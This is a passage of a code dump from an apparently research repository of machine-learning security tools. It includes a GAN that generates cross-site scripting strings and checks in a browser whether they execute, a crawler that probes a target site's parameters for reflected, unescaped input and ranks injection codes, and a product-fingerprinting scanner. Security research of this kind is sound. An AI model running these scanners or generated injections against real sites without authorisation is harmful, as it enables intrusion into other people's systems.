            pd.DataFrame(result_list, columns=['eval_place', 'injection_code']).to_csv(gan_save_path, mode='w', header=True, index=False)
        else:
            pd.DataFrame(result_list).to_csv(gan_save_path, mode='a', header=False, index=False)
        vector_result_list = []
        for idx in range(self.max_synthetic_num):
            noise_idx1 = np.random.randint(0, len(valid_code_list))
            noise_idx2 = np.random.randint(0, len(valid_code_list))
            self.util.print_message(NOTE, '{}/{} Synthesize injection codes.'.format(idx + 1, self.max_synthetic_num))
            self.util.print_message(OK, 'Use two injection codes : ({}) + ({}).'.format(valid_code_list[noise_idx1][0], valid_code_list[noise_idx2][0]))
            synthesized_noise = self.vector_mean(valid_code_list[noise_idx1][1], valid_code_list[noise_idx2][1])
            generated_codes = self.generator.predict(synthesized_noise, verbose=0)
            str_html = self.util.transform_gene_num2str(self.df_genes, self.transform_code2gene(generated_codes[0]))
            for eval_place in self.eval_place_list:
                hit_flag = 'Failure'
                html = self.template.render({eval_place: str_html})
                with codecs.open(self.eval_html_path, 'w', encoding='utf-8') as fout:
                    fout.write(html)
                (selenium_score, error_flag) = self.util.check_individual_selenium(self.obj_browser, self.eval_html_path)
                if error_flag:
                    continue
                if selenium_score > 0:
                    self.util.print_message(WARNING, 'Find running script: ""{}"".'.format(str_html))
                    hit_flag = 'Bingo'
                vector_result_list.append([eval_place, str_html, valid_code_list[noise_idx1][0], valid_code_list[noise_idx2][0], hit_flag])
        if os.path.exists(vec_save_path) is False:
            pd.DataFrame(vector_result_list, columns=['eval_place', 'synthesized_code', 'origin_code1', 'origin_code2', 'bingo']).to_csv(vec_save_path, mode='w', header=True, index=False)
        else:
            pd.DataFrame(vector_result_list).to_csv(vec_save_path, mode='a', header=False, index=False)
    else:
        sig_path = self.util.join_path(self.result_dir, self.ga_result_file.replace('*', self.obj_browser.name))
        df_temp = pd.read_csv(sig_path, encoding='utf-8').fillna('')
        df_sigs = df_temp[~df_temp.duplicated()]
        list_sigs = []
        for idx in range(len(df_sigs)):
            list_temp = df_sigs['sig_vector'].values[idx].replace('[', '').replace(']', '').split(',')
            list_sigs.append([int(s) for s in list_temp])
        lst_scripts = []
        target_sig_list = []
        for target_sig in list_sigs:
            self.util.print_message(NOTE, 'Start generating injection codes using {}'.format(target_sig))
            target_sig_list.extend([target_sig for _ in range(self.max_sig_num)])
        lst_scripts.extend(self.train(target_sig_list))
        if os.path.exists(gan_save_path) is False:
            pd.DataFrame(lst_scripts, columns=['eval_place', 'injection_code']).to_csv(gan_save_path, mode='w', header=True, index=False)
        else:
            pd.DataFrame(lst_scripts).to_csv(gan_save_path, mode='a', header=False, index=False)
    self.util.print_message(NOTE, 'Done generation of injection codes using Generative Adversarial Networks.')"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self):
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except FileExistsError as err:
        self.print_message(FAIL, 'File exists error: {}'.format(err))
        sys.exit(1)"
13o-bbr-bbq/machine_learning_security,print_message,"def print_message(self, type, message):
    if os.name == 'nt':
        if type == NOTE:
            print('[+] ' + message)
        elif type == FAIL:
            print('[-] ' + message)
        elif type == WARNING:
            print('[!] ' + message)
        elif type == NONE:
            print(message)
        else:
            print('[*] ' + message)
    elif type == NOTE:
        print(PRINT_NOTE + ' ' + message)
    elif type == FAIL:
        print(PRINT_FAIL + ' ' + message)
    elif type == WARNING:
        print(PRINT_WARN + ' ' + message)
    elif type == NONE:
        print(NOTE_GREEN + message + ENDC)
    else:
        print(PRINT_OK + ' ' + message)"
13o-bbr-bbq/machine_learning_security,print_exception,"def print_exception(self, e, message):
    self.print_message(WARNING, 'type:{}'.format(type(e)))
    self.print_message(WARNING, 'args:{}'.format(e.args))
    self.print_message(WARNING, '{}'.format(e))
    self.print_message(WARNING, message)"
13o-bbr-bbq/machine_learning_security,get_random_token,"def get_random_token(self, length):
    chars = string.digits + string.ascii_letters
    return ''.join([random.choice(chars) for _ in range(length)])"
13o-bbr-bbq/machine_learning_security,get_current_date,"def get_current_date(self, indicate_format=None):
    if indicate_format is not None:
        date_format = indicate_format
    else:
        date_format = self.report_date_format
    return datetime.now().strftime(date_format)"
13o-bbr-bbq/machine_learning_security,transform_date_object,"def transform_date_object(self, target_date):
    return datetime.strptime(target_date, self.report_date_format)"
13o-bbr-bbq/machine_learning_security,transform_date_string,"def transform_date_string(self, target_date):
    return target_date.strftime(self.report_date_format)"
13o-bbr-bbq/machine_learning_security,delete_ctrl_char,"def delete_ctrl_char(self, origin_text):
    clean_text = ''
    for char in origin_text:
        ord_num = ord(char)
        if (ord_num == 10 or ord_num == 13) or 32 <= ord_num <= 126:
            clean_text += chr(ord_num)
    return clean_text"
13o-bbr-bbq/machine_learning_security,join_path,"def join_path(self, path1, path2):
    return os.path.join(path1, path2)"
13o-bbr-bbq/machine_learning_security,transform_gene_num2str,"def transform_gene_num2str(self, df_gene, individual_genom_list):
    indivisual = ''
    for gene_num in individual_genom_list:
        indivisual += str(df_gene.loc[gene_num].values[0])
        indivisual = indivisual.replace('%s', ' ').replace('&quot;', '""').replace('%comma', ',').replace('&apos;', ""'"")
    return indivisual"
13o-bbr-bbq/machine_learning_security,check_individual_selenium,"def check_individual_selenium(self, obj_browser, eval_html_path):
    int_score = 0
    error_flag = False
    try:
        obj_browser.get(eval_html_path)
    except Exception as e:
        obj_browser.switch_to.alert.accept()
        error_flag = True
        return (int_score, error_flag)
    try:
        obj_browser.refresh()
        ActionChains(obj_browser).move_by_offset(10, 10).perform()
        obj_browser.refresh()
    except Exception as e:
        obj_browser.switch_to.alert.accept()
        int_score = 1
    return (int_score, error_flag)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, utility, target):
    self.utility = utility
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except FileExistsError as err:
        self.utility.print_exception(err, 'File exists error: {}', err)
        exit(1)
    self.output_base_path = config['Spider']['output_base_path']
    check_path = os.path.join(full_path, self.output_base_path)
    if os.path.exists(check_path) is False:
        os.mkdir(check_path)
    self.output_filename = config['Spider']['output_filename']
    self.spider_delay_time = config['Spider']['delay_time']
    signature_dir = os.path.join(full_path, config['Investigator']['signature_dir'])
    self.signature_path = os.path.join(signature_dir, config['Investigator']['signature_file'])
    scan_result_dir = os.path.join(full_path, config['Investigator']['scan_result_dir'])
    if os.path.exists(scan_result_dir) is False:
        os.mkdir(scan_result_dir)
    self.scan_result_file = config['Investigator']['scan_result_file']
    self.scan_result_path = os.path.join(scan_result_dir, self.scan_result_file)
    self.target_tags = config['Investigator']['target_tags']
    self.convert_tags = config['Investigator']['convert_tags']
    self.convert_attr = config['Investigator']['convert_attr']
    self.convert_js = config['Investigator']['convert_js']
    self.convert_vbs = config['Investigator']['convert_vbs']
    self.convert_quot = config['Investigator']['convert_quot']
    self.output_key = config['Investigator']['output_key']
    self.escape_key = config['Investigator']['escape_key']
    self.escape_value = config['Investigator']['escape_value']
    self.scan_delay_time = float(config['Investigator']['delay_time'])
    if config['Investigator']['proxy_switch'] == 'on':
        self.proxy_switch = True
    else:
        self.proxy_switch = False
    self.proxy_scheme = config['Investigator']['proxy_scheme']
    self.proxy_addr = config['Investigator']['proxy_addr']
    self.conn_timeout = config['Investigator']['conn_timeout']
    self.delay_time = config['Investigator']['delay_time']
    self.str_target_url = target
    obj_parsed = urlparse(target)
    self.str_allow_domain = str(obj_parsed.netloc).split(':')[0]
    self.obj_signatures = pd.read_csv(self.signature_path, encoding='utf-8').fillna('')
    self.dic_feature = {'Url': '', 'Param': ''}
    self.dic_feature_temp = {}
    self.dic_convert_output = {}
    self.dic_convert_escape = {}
    self.make_dictionary()"
13o-bbr-bbq/machine_learning_security,make_dictionary,"def make_dictionary(self):
    list_tags = self.convert_tags.split(',')
    list_attr = self.convert_attr.split(',')
    list_js = self.convert_js.split(',')
    list_vbs = self.convert_vbs.split(',')
    list_quot = self.convert_quot.split(',')
    for (idx, str_tag) in enumerate(list_tags):
        self.dic_convert_output[str_tag] = idx
    for (idx, str_attr) in enumerate(list_attr):
        self.dic_convert_output[str_attr] = idx
    for (idx, str_js) in enumerate(list_js):
        self.dic_convert_output[str_js] = idx
    for (idx, str_vbs) in enumerate(list_vbs):
        self.dic_convert_output[str_vbs] = idx
    for (idx, str_quot) in enumerate(list_quot):
        self.dic_convert_output[str_quot] = idx
    list_esc_value = self.escape_value.split(',')
    list_esc_key = self.escape_key.split(',')
    for (str_key, str_value) in zip(list_esc_value, list_esc_key):
        self.dic_convert_escape[str_key] = str_value
    list_output = self.output_key.split(',')
    for str_output in list_output:
        self.dic_feature[str_output] = 0
    for str_escape in list_esc_key:
        self.dic_feature[str_escape] = 0"
13o-bbr-bbq/machine_learning_security,convert_feature_list,"def convert_feature_list(self, dic_feature):
    lst_feature = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    list_output = self.output_key.split(',')
    list_esc_key = self.escape_key.split(',')
    idx = 0
    for str_output_key in list_output:
        lst_feature[idx] = dic_feature[str_output_key]
        idx += 1
    for str_escape_key in list_esc_key:
        lst_feature[idx] = dic_feature[str_escape_key]
        idx += 1
    return lst_feature"
13o-bbr-bbq/machine_learning_security,gen_rand_str,"def gen_rand_str(self, int_length):
    str_chars = string.digits + string.ascii_letters
    return ''.join([random.choice(str_chars) for _ in range(int_length)])"
13o-bbr-bbq/machine_learning_security,convert_feature_to_vector,"def convert_feature_to_vector(self, str_type, str_feature):
    if str_feature == '':
        str_feature = 'none_' + str_type
    try:
        return int(self.dic_convert_output[str_feature])
    except:
        return 99"
13o-bbr-bbq/machine_learning_security,get_escape_key_name,"def get_escape_key_name(self, str_mark):
    try:
        return self.dic_convert_escape[str_mark]
    except:
        self.utility.print_message(FAIL, 'Conversion key is not found: {}.'.format(str_mark))
        exit(1)"
13o-bbr-bbq/machine_learning_security,specify_escape_type,"def specify_escape_type(self, str_response, str_seek_before, str_seek_after, str_signature, dic_feature_local):
    str_pattern = '.*' + str_seek_before + '(.*)' + str_seek_after
    obj_match = re.match(str_pattern, str_response.replace('\t', '').replace('\r', '').replace('\n', ''))
    if obj_match is not None:
        lst_signatures = str_signature.split('|')
        for str_mark in lst_signatures:
            if str_mark in obj_match.group(1):
                dic_feature_local[self.get_escape_key_name(str_mark)] = 0
            else:
                dic_feature_local[self.get_escape_key_name(str_mark)] = 1
    return dic_feature_local"
13o-bbr-bbq/machine_learning_security,specify_feature_escape,"def specify_feature_escape(self, dict_params, int_idx, str_url, str_param, dic_feature_local):
    dict_craft_params = copy.deepcopy(dict_params)
    str_seek_before = self.gen_rand_str(3)
    str_seek_after = self.gen_rand_str(3)
    str_signature = str(self.obj_signatures['Signature'][int_idx])
    lst_signatures = str_signature.split('|')
    str_inspect_value = ''
    for elem in lst_signatures:
        str_inspect_value += elem
    str_inspect = str_seek_before + dict_craft_params[str_param][0] + str_inspect_value + str_seek_after
    dict_craft_params[str_param] = str_inspect
    obj_session = Session()
    obj_request = Request('GET', str_url, params=dict_craft_params)
    obj_prepped = obj_session.prepare_request(obj_request)
    obj_response = None
    try:
        if self.proxy_switch:
            obj_response = obj_session.send(obj_prepped, verify=False, proxies={self.proxy_scheme: self.proxy_addr}, timeout=int(self.conn_timeout), allow_redirects=False)
        else:
            obj_response = obj_session.send(obj_prepped, verify=False, timeout=int(self.conn_timeout), allow_redirects=False)
    except Exception as err:
        self.utility.print_exception(err, '{}'.format(err))
        return dic_feature_local
    return self.specify_escape_type(obj_response.text, str_seek_before, str_seek_after, str_signature, dic_feature_local)"
13o-bbr-bbq/machine_learning_security,specify_feature,"def specify_feature(self, str_response, str_url, dict_params, str_param, str_craft_value):
    lst_tag_feature = []
    obj_bs = BeautifulSoup(str_response, 'lxml')
    lst_get_tags = self.target_tags.split(',')
    for str_tag in lst_get_tags:
        obj_bs_temp = copy.copy(obj_bs)
        lst_tags = obj_bs_temp.find_all(str_tag)
        obj_bs_temp = None
        if len(lst_tags) == 0:
            continue
        for obj_tag in lst_tags:
            lst_attrs = obj_tag.attrs.keys()
            for str_attr in lst_attrs:
                if str_craft_value in obj_tag.attrs[str_attr]:
                    str_tag = str(obj_tag)
                    idx = str(obj_tag).find(str_craft_value)
                    dic_feature_attr = copy.deepcopy(self.dic_feature)
                    dic_feature_attr['Html'] = self.convert_feature_to_vector('html', obj_tag.name)
                    dic_feature_attr['Attribute'] = self.convert_feature_to_vector('attribute', str_attr)
                    dic_feature_attr['JavaScript'] = 0
                    dic_feature_attr['VBScript'] = 0
                    dic_feature_attr['Quotation'] = self.convert_feature_to_vector('quotation', str_tag[idx - 1:idx])
                    for idx in range(len(self.obj_signatures)):
                        dic_feature_attr = self.specify_feature_escape(dict_params, idx, str_url, str_param, dic_feature_attr)
                    lst_tag_feature.append(self.convert_feature_list(dic_feature_attr))
            if str_craft_value in obj_tag.get_text():
                dic_feature_contents = copy.deepcopy(self.dic_feature)
                dic_feature_contents['Html'] = self.convert_feature_to_vector('html', obj_tag.name)
                dic_feature_contents['Attribute'] = 0
                dic_feature_contents['JavaScript'] = 0
                dic_feature_contents['VBScript'] = 0
                dic_feature_contents['Quotation'] = 0
                for idx in range(len(self.obj_signatures)):
                    dic_feature_contents = self.specify_feature_escape(dict_params, idx, str_url, str_param, dic_feature_contents)
                lst_tag_feature.append(self.convert_feature_list(dic_feature_contents))
    return lst_tag_feature"
13o-bbr-bbq/machine_learning_security,run_spider,"def run_spider(self):
    now_time = datetime.now().strftime('%Y%m%d%H%M%S')
    str_result_file = os.path.join(self.output_base_path, now_time + self.output_filename)
    str_cmd_option = ' -a target_url=' + self.str_target_url + ' -a allow_domain=' + self.str_allow_domain + ' -a delay=' + self.spider_delay_time
    str_cmd = 'scrapy runspider Spider.py' + str_cmd_option + ' -o ' + str_result_file
    proc = Popen(str_cmd, shell=True)
    proc.wait()
    dict_json = {}
    if os.path.exists(str_result_file):
        with codecs.open(str_result_file, 'r', encoding='utf-8') as fin:
            target_text = self.utility.delete_ctrl_char(fin.read())
            if target_text != '':
                dict_json = json.loads(target_text)
            else:
                self.utility.print_message(WARNING, '[{}] is empty.'.format(str_result_file))
    lst_target = []
    for idx in range(len(dict_json)):
        items = dict_json[idx]['urls']
        for item in items:
            if self.str_allow_domain in item:
                lst_target.append(item)
    return list(set(lst_target))"
13o-bbr-bbq/machine_learning_security,main_control,"def main_control(self):
    lst_target = self.run_spider()
    all_feature_list = []
    all_target_list = []
    for str_url in lst_target:
        obj_parsed = urlparse(str_url)
        if self.str_allow_domain != str(obj_parsed.netloc).split(':')[0]:
            self.utility.print_message(WARNING, 'Not allow domain: {}'.format(str_url))
            continue
        if '?' in str_url:
            dict_params = parse_qs(str_url[str_url.find('?') + 1:])
            lst_param = dict_params.keys()
        else:
            continue
        for str_param in lst_param:
            dict_craft_params = copy.deepcopy(dict_params)
            str_value = dict_params[str_param][0]
            str_seek_before = self.gen_rand_str(3)
            str_seek_after = self.gen_rand_str(3)
            dict_craft_params[str_param] = str_seek_before + str_value + str_seek_after
            str_target = str_url[:str_url.find('?')]
            obj_session = Session()
            obj_request = Request('GET', str_target, params=dict_craft_params)
            obj_prepped = obj_session.prepare_request(obj_request)
            obj_response = None
            try:
                if self.proxy_switch:
                    obj_response = obj_session.send(obj_prepped, verify=False, proxies={self.proxy_scheme: self.proxy_addr}, timeout=int(self.conn_timeout), allow_redirects=False)
                else:
                    obj_response = obj_session.send(obj_prepped, verify=False, timeout=int(self.conn_timeout), allow_redirects=False)
            except Exception as err:
                self.utility.print_exception(err, '{}'.format(err))
                continue
            self.utility.print_message(OK, str_url + ',' + str(obj_response.status_code))
            if dict_craft_params[str_param] in obj_response.text:
                self.dic_feature['Url'] = str_url
                self.dic_feature['Param'] = str_param
                feature_list = self.specify_feature(obj_response.text, str_target, dict_params, str_param, dict_craft_params[str_param])
                for feature in feature_list:
                    all_feature_list.append(feature)
                    all_target_list.append([str_url, str_param])
            else:
                continue
        time.sleep(float(self.delay_time))
    return (all_feature_list, all_target_list)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, utility, state_size=17, save_name='recommender'):
    self.utility = utility
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except FileExistsError as err:
        self.utility.print_exception(err, 'File exists error: {}', err)
        exit(1)
    self.epoch = int(config['Recommender']['epoch'])
    self.batch_size = int(config['Recommender']['batch_size'])
    trained_dir = os.path.join(full_path, config['Recommender']['trained_dir'])
    if os.path.exists(trained_dir) is False:
        os.mkdir(trained_dir)
    train_dir = os.path.join(full_path, config['Recommender']['train_dir'])
    self.train_path = os.path.join(train_dir, config['Recommender']['train_file'])
    self.state_size = state_size
    self.save_path = os.path.join(trained_dir, save_name)
    (self.X_train, self.Y_train, self.colums, self.classes, self.y_data, self.output_size) = self.load_train_data()"
13o-bbr-bbq/machine_learning_security,build_multilayer_perceptron,"def build_multilayer_perceptron(self):
    model = Sequential()
    model.add(Dense(50, input_dim=self.state_size))
    model.add(Activation('relu'))
    model.add(Dropout(0.2))
    model.add(Dense(100))
    model.add(Activation('relu'))
    model.add(Dropout(0.2))
    model.add(Dense(100))
    model.add(Activation('relu'))
    model.add(Dropout(0.2))
    model.add(Dense(self.output_size))
    model.add(Activation('softmax'))
    return model"
13o-bbr-bbq/machine_learning_security,load_train_data,"def load_train_data(self):
    X_train = []
    Y_train = []
    tmp_classes = []
    self.utility.print_message(OK, 'Loading train data and Create label.')
    obj_train = pd.read_csv(self.train_path, encoding='utf-8').fillna('')
    df_X_train = obj_train.iloc[:, 0:17]
    for idx in range(len(df_X_train)):
        X_train.append(list(df_X_train.loc[idx].values.flatten()))
    df_Y_train = obj_train.iloc[:, [17, 18]]
    for idx in range(len(df_Y_train)):
        Y_train.append(list(df_Y_train.iloc[idx, [0]].values.flatten()))
        tmp_classes.append(df_Y_train.iloc[idx, [0]].values.flatten()[0])
    classes = list(set(tmp_classes))
    return (X_train, Y_train, len(df_X_train.columns), classes, df_Y_train, len(classes))"
13o-bbr-bbq/machine_learning_security,training_model,"def training_model(self):
    self.utility.print_message(NOTE, 'Training...')
    batch_size = self.batch_size
    nb_epoch = self.epoch
    X_train = np.array(self.X_train, np.ndarray)
    X_train = X_train.reshape(len(X_train), self.colums)
    self.utility.print_message(OK, 'Train samples: {}'.format(X_train.shape[0]))
    Y_train = np_utils.to_categorical(self.Y_train, self.output_size)
    (X_train, X_test, Y_train, Y_test) = train_test_split(X_train, Y_train, train_size=0.8)
    model = self.build_multilayer_perceptron()
    model.summary()
    model.compile(loss='categorical_crossentropy', optimizer=Adam(), metrics=['accuracy'])
    _ = model.fit(X_train, Y_train, batch_size=batch_size, nb_epoch=nb_epoch, verbose=1, validation_split=0.1)
    self.utility.print_message(NOTE, 'Finish training...')
    (loss, accuracy) = model.evaluate(X_test, Y_test, verbose=0)
    self.utility.print_message(OK, 'Model Evaluation: Loss: {}, Acc: {}'.format(loss, accuracy))
    model.save_weights('{}.h5'.format(self.save_path), True)
    self.utility.print_message(OK, 'Saved model: {}.h5'.format(self.save_path))"
13o-bbr-bbq/machine_learning_security,predict,"def predict(self, lst_feature):
    self.utility.print_message(NOTE, 'Start prediction...')
    model = self.build_multilayer_perceptron()
    model.load_weights('{}.h5'.format(self.save_path))
    self.utility.print_message(OK, 'Loading trained data: {}.h5'.format(self.save_path))
    model.compile(loss='categorical_crossentropy', optimizer=Adam(), metrics=['accuracy'])
    X_test = np.array(lst_feature, np.ndarray)
    X_test = X_test.reshape(1, 17)
    pred = model.predict(X_test)[0]
    top = 3
    top_indices = pred.argsort()[-top:][::-1]
    result = [(self.classes[i], pred[i]) for i in top_indices]
    self.utility.print_message(NONE, 'Recommended.')
    self.utility.print_message(NONE, 'Rank\tInjection code\tProbability')
    self.utility.print_message(NONE, '=' * 80)
    for (idx, item) in enumerate(result):
        injection_code = self.y_data[self.y_data['label'] == int(item[0])].values.flatten()[1]
        injection_code = injection_code[1:-1].replace('\\n', '%0a').replace('\\r', '%0d')
        self.utility.print_message(OK, '{}\t{}\t{}'.format(idx + 1, injection_code, item[1]))
    self.utility.print_message(NOTE, 'Finish prediction...')"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, category=None, *args, **kwargs):
    super(SimpleSpider, self).__init__(*args, **kwargs)
    self.start_urls = getattr(self, 'target_url', None)
    self.allowed_domains = [getattr(self, 'allow_domain', None)]
    self.delay_time = float(getattr(self, 'delay', None))
    self.custom_settings = {'DEPTH_LIMIT ': 5, 'DOWNLOAD_DELAY': self.delay_time, 'ROBOTSTXT_OBEY': True, 'FEED_EXPORT_ENCODING': 'utf-8'}"
13o-bbr-bbq/machine_learning_security,start_requests,"def start_requests(self):
    url = self.start_urls
    yield Request(url, self.parse)"
13o-bbr-bbq/machine_learning_security,parse,"def parse(self, response):
    for href in response.css('a::attr(href)'):
        full_url = response.urljoin(href.extract())
        time.sleep(self.delay_time)
        yield scrapy.Request(full_url, callback=self.parse_item)"
13o-bbr-bbq/machine_learning_security,parse_item,"def parse_item(self, response):
    urls = []
    for href in response.css('a::attr(href)'):
        full_url = response.urljoin(href.extract())
        urls.append(full_url)
    yield {'urls': urls}"
13o-bbr-bbq/machine_learning_security,show_banner,"def show_banner(utility):
    banner = '\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n██████╗ ███████╗ ██████╗ ██████╗ ███╗   ███╗███╗   ███╗███████╗███╗   ██╗██████╗ ███████╗██████╗ \n██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗\n██████╔╝█████╗  ██║     ██║   ██║██╔████╔██║██╔████╔██║█████╗  ██╔██╗ ██║██║  ██║█████╗  ██████╔╝\n██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗\n██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║ ╚████║██████╔╝███████╗██║  ██║\n╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝ (beta)\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n' + 'by ' + os.path.basename(__file__)
    utility.print_message(NONE, banner)
    show_credit(utility)
    time.sleep(utility.banner_delay)"
13o-bbr-bbq/machine_learning_security,show_credit,"def show_credit(utility):
    credit = u'\n       =[ Recommender v0.0.1-beta                                            ]=\n+ -- --=[ Author  : Isao Takaesu (@bbr_bbq)                                  ]=--\n+ -- --=[ Website : https://github.com/13o-bbr-bbq/machine_learning_security ]=--\n    '
    utility.print_message(NONE, credit)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self):
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    config.read(os.path.join(full_path, 'config.ini'))
    try:
        self.banner_delay = float(config['Common']['banner_delay'])
        self.report_date_format = config['Common']['date_format']
        self.con_timeout = float(config['Common']['con_timeout'])
        log_dir = os.path.join(full_path, config['Common']['log_path'])
        if os.path.exists(log_dir) is False:
            os.mkdir(log_dir)
        self.log_path = os.path.join(log_dir, config['Common']['log_file'])
    except Exception as e:
        self.print_message(FAIL, 'Reading config.ini is failure : {}'.format(e))
        sys.exit(1)
    self.logger = getLogger('Recommender')
    self.logger.setLevel(20)
    file_handler = FileHandler(self.log_path)
    self.logger.addHandler(file_handler)
    formatter = Formatter('%(levelname)s,%(message)s')
    file_handler.setFormatter(formatter)"
13o-bbr-bbq/machine_learning_security,print_message,"def print_message(self, type, message):
    if os.name == 'nt':
        if type == NOTE:
            print('[+] ' + message)
        elif type == FAIL:
            print('[-] ' + message)
        elif type == WARNING:
            print('[!] ' + message)
        elif type == NONE:
            print(message)
        else:
            print('[*] ' + message)
    elif type == NOTE:
        print(PRINT_NOTE + ' ' + message)
    elif type == FAIL:
        print(PRINT_FAIL + ' ' + message)
    elif type == WARNING:
        print(PRINT_WARN + ' ' + message)
    elif type == NONE:
        print(NOTE_GREEN + message + ENDC)
    else:
        print(PRINT_OK + ' ' + message)"
13o-bbr-bbq/machine_learning_security,print_exception,"def print_exception(self, e, message):
    self.print_message(WARNING, 'type:{}'.format(type(e)))
    self.print_message(WARNING, 'args:{}'.format(e.args))
    self.print_message(WARNING, '{}'.format(e))
    self.print_message(WARNING, message)"
13o-bbr-bbq/machine_learning_security,write_log,"def write_log(self, loglevel, message):
    self.logger.log(loglevel, self.get_current_date() + ' ' + message)"
13o-bbr-bbq/machine_learning_security,get_random_token,"def get_random_token(self, length):
    chars = string.digits + string.ascii_letters
    return ''.join([random.choice(chars) for _ in range(length)])"
13o-bbr-bbq/machine_learning_security,get_current_date,"def get_current_date(self, indicate_format=None):
    if indicate_format is not None:
        date_format = indicate_format
    else:
        date_format = self.report_date_format
    return datetime.now().strftime(date_format)"
13o-bbr-bbq/machine_learning_security,transform_date_object,"def transform_date_object(self, target_date, format=None):
    if format is None:
        return datetime.strptime(target_date, self.report_date_format)
    else:
        return datetime.strptime(target_date, format)"
13o-bbr-bbq/machine_learning_security,transform_date_string,"def transform_date_string(self, target_date):
    return target_date.strftime(self.report_date_format)"
13o-bbr-bbq/machine_learning_security,delete_ctrl_char,"def delete_ctrl_char(self, origin_text):
    clean_text = ''
    for char in origin_text:
        ord_num = ord(char)
        if (ord_num == 10 or ord_num == 13) or 32 <= ord_num <= 126:
            clean_text += chr(ord_num)
    return clean_text"
13o-bbr-bbq/machine_learning_security,check_arg_value,"def check_arg_value(self, protocol, fqdn, port, path):
    if protocol not in ['http', 'https']:
        self.print_message(FAIL, 'Invalid protocol : {}'.format(protocol))
    if isinstance(fqdn, str) is False and isinstance(fqdn, int) is False:
        self.print_message(FAIL, 'Invalid IP address : {}'.format(fqdn))
        return False
    if port.isdigit() is False:
        self.print_message(FAIL, 'Invalid port number : {}'.format(port))
        return False
    elif int(port) < 1 or int(port) > 65535:
        self.print_message(FAIL, 'Invalid port number : {}'.format(port))
        return False
    if isinstance(path, str) is False and isinstance(path, int) is False:
        self.print_message(FAIL, 'Invalid path : {}'.format(path))
        return False
    elif path.startswith('/') is False or path.endswith('/') is False:
        self.print_message(FAIL, 'Invalid path : {}'.format(path))
        return False
    return True"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, utility):
    self.utility = utility
    config = configparser.ConfigParser()
    self.file_name = os.path.basename(__file__)
    self.full_path = os.path.dirname(os.path.abspath(__file__))
    self.root_path = os.path.join(self.full_path, '../')
    config.read(os.path.join(self.root_path, 'config.ini'))
    try:
        self.signature_dir = os.path.join(self.root_path, config['Common']['signature_path'])
        self.signature_file = config['ContentExplorer']['signature_file']
        self.delay_time = float(config['ContentExplorer']['delay_time'])
    except Exception as e:
        self.utility.print_message(FAIL, 'Reading config.ini is failure : {}'.format(e))
        sys.exit(1)"
13o-bbr-bbq/machine_learning_security,check_version,"def check_version(self, default_ver, version_pattern, response):
    version = default_ver
    if version_pattern != '*':
        obj_match = re.search(version_pattern, response, flags=re.IGNORECASE)
        if obj_match is not None and obj_match.re.groups > 1:
            version = obj_match.group(2)
    return version"
13o-bbr-bbq/machine_learning_security,examine_response,"def examine_response(self, check_pattern, default_ver, version_pattern, response):
    self.utility.print_message(NOTE, 'Confirm string matching.')
    result = []
    if check_pattern != '*' and re.search(check_pattern, response, flags=re.IGNORECASE) is not None:
        result.append(True)
        result.append(self.check_version(default_ver, version_pattern, response))
    elif check_pattern == '*':
        result.append(True)
        result.append(self.check_version(default_ver, version_pattern, response))
    else:
        result.append(False)
        result.append(default_ver)
    return result"
13o-bbr-bbq/machine_learning_security,content_explorer,"def content_explorer(self, parsed, target_base, client):
    self.utility.print_message(NOTE, 'Explore unnecessary contents.')
    signature_file = os.path.join(self.signature_dir, self.signature_file)
    product_list = []
    with codecs.open(signature_file, 'r', encoding='utf-8') as fin:
        signatures = fin.readlines()
        for (idx, signature) in enumerate(signatures):
            if (idx + 1) % 10 == 0:
                client.keep_alive()
            items = signature.replace('\n', '').replace('\r', '').split('@')
            product_name = items[0].lower()
            default_ver = items[1]
            path = items[2]
            check_pattern = items[3]
            version_pattern = items[4]
            target_url = ''
            if path.startswith('/') is True:
                target_url = target_base + path[1:]
            else:
                target_url = target_base + path
            (res, res_header, res_body) = self.utility.send_request('GET', target_url)
            msg = '{}/{} Accessing : Status: {}, Url: {}'.format(idx + 1, len(signatures), res.status, target_url)
            self.utility.print_message(OK, msg)
            if res.status in [200, 301, 302]:
                result = self.examine_response(check_pattern, default_ver, version_pattern, res_header + res_body)
                if result[0] is True:
                    if path.endswith('/') is False:
                        path += '/'
                    port_num = 80
                    if parsed.port is not None:
                        port_num = parsed.port
                    product_list.extend([product_name + '@' + str(result[1]) + '@' + str(port_num) + '@' + path])
                    msg = 'Find product={}/{} from {}'.format(product_name, str(result[1]), target_url)
                    self.utility.print_message(OK, msg)
            time.sleep(self.delay_time)
    return product_list"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self):
    self.vocabularies = set()
    self.word_count = {}
    self.category_count = {}
    self.file_name = os.path.basename(__file__)"
